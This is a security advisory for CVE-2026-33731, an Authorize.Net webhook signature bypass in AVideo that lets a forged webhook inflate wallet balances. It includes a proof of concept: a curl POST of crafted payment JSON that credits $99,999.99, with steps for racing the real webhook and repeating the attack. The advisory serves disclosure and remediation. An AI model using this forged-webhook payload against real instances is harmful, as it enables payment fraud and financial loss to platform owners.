# [M] AVideo has an Authorize.Net Webhook Signature Bypass that Enables Wallet Balance Inflation via Forged Payment Data

## Summary
Severity: Medium
Advisory: GHSA-95jh-7r58-xmxw
CVE: CVE-2026-33731
CWE: CWE-345
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-95jh-7r58-xmxw
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0 <29.0

## Details
## Summary

The Authorize.Net webhook handler at `plugin/AuthorizeNet/webhook.php` contains a signature verification bypass that allows an attacker to forge webhook requests with arbitrary payment amounts and target user IDs. By supplying a valid transaction ID from a small legitimate purchase, the attacker bypasses signature validation and credits arbitrary wallet balances to any user account via attacker-controlled payload fields.

## Details

Three flaws combine into an exploit chain:

### 1. Signature Bypass via OR Logic (webhook.php:33)

```php
if (!$parsed['signatureValid'] && (empty($txnInfo) || !empty($txnInfo['error']))) {
    http_response_code(401);
    echo 'invalid signature';
    exit;
}
```

The webhook is rejected only when **both** conditions are true: the signature is invalid **AND** the transaction lookup fails. If the attacker supplies a real transaction ID (e.g., from their own $1 purchase), `getTransactionDetails()` succeeds and returns valid data, so the second condition is false. The invalid signature is silently ignored.

### 2. Payload Values Override API-Fetched Values (AuthorizeNet.php:169-171, webhook.php:44-48)

In `analyzeTransactionFromWebhook()`, `users_id` and `amount` are extracted from the attacker-controlled webhook **payload** first:

```php
$users_id = isset($metadata['users_id']) ? (int)$metadata['users_id'] : null;
$amount   = isset($payload['amount']) ? (float)$payload['amount'] : ...;
```

The fallback logic in webhook.php only applies when the analysis values are empty/falsy:

```php
if (!$analysis['users_id'] && !empty($txnInfo['users_id'])) {
    $analysis['users_id'] = (int)$txnInfo['users_id'];
}
if (!$analysis['amount'] && isset($txnInfo['amount'])) {
    $analysis['amount'] = (float)$txnInfo['amount'];
}
```

Since the forged payload already provides both values, the authoritative API-fetched values are never used.

### 3. Missing Approval Check (webhook.php:61-75)

The code checks only that `users_id` and `amount` are non-empty before calling `processSinglePayment()`. The `isApproved` field is computed in `analyzeTransactionFromWebhook()` (line 222-228) but **never verified** before crediting the wallet at line 68-75.

## PoC

**Prerequisites:** Attacker has a low-privileged account on the AVideo instance and has made at least one legitimate small Authorize.Net purchase (e.g., $1.00), noting the transaction ID (e.g., `60123456789`).

1. Immediately after the purchase completes (to race the legitimate webhook), send a forged webhook:

```bash
curl -X POST https://target.com/plugin/AuthorizeNet/webhook.php \
  -H 'Content-Type: application/json' \
  -d '{
    "eventType": "net.authorize.payment.authcapture.created",
    "payload": {
      "id": "60123456789",
      "amount": 99999.99,
      "responseCode": 1,
      "metadata": {
        "users_id": 2
      }
    }
  }'
```

2. The signature check fails (no `X-ANET-Signature` header), but `getTransactionDetails('60123456789')` succeeds because it is a real transaction. The OR condition on line 33 is not fully satisfied, so execution continues.

3. `analyzeTransactionFromWebhook()` uses the forged payload's `amount: 99999.99` and `metadata.users_id: 2`.

4. `processSinglePayment()` credits $99,999.99 to user ID 2's wallet via `addBalance()`.

5. The dedup key is `sha1('net.authorize.payment.authcapture.created' . '60123456789')`, so the legitimate webhook arriving later is silently discarded as a duplicate.

6. The attacker can repeat with new transaction IDs from additional small purchases for cumulative balance inflation.

## Impact

- **Wallet balance inflation:** Attacker credits arbitrary amounts to any user's wallet without corresponding payment, bypassing the payment gateway's actual charge amount.
- **Premium content access:** Inflated wallet balance allows purchasing all paid/premium video content without real payment.
- **Subscription fraud:** By including `plans_id` in forged metadata, the attacker can activate premium subscriptions (webhook.php:86-134) without corresponding payment.
- **Financial loss:** Platform owner loses revenue from fraudulently accessed premium content and services.

## Recommended Fix

**1. Reject webhooks with invalid signatures unconditionally** — the transaction lookup should only be used for data enrichment *after* signature validation passes:

```php
// webhook.php line 33 — FIX: reject on invalid signature alone
if (!$parsed['signatureValid']) {
    _error_log('[Authorize.Net webhook] Bad signature');
    http_response_code(401);
    echo 'invalid signature';
    exit;
}
```

**2. Use API-fetched values as authoritative** — in webhook.php lines 44-55, invert the precedence so `$txnInfo` values always override payload values:

```php
// Always prefer API-fetched values over payload values
if (!empty($txnInfo['users_id'])) {
    $analysis['users_id'] = (int)$txnInfo['users_id'];
}
if (isset($txnInfo['amount'])) {
    $analysis['amount'] = (float)$txnInfo['amount'];
}
```

**3. Check `isApproved` before processing** — add a gate before `processSinglePayment()`:

```php
if (!$analysis['isApproved']) {
    _error_log('[Authorize.Net webhook] Transaction not approved');
    http_response_code(400);
    echo 'transaction not approved';
    exit;
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-95jh-7r58-xmxw
- https://github.com/WWBN/AVideo/commit/033e83ae904cacb99495dbea7cbcfb3738cf42e4
- https://github.com/WWBN/AVideo
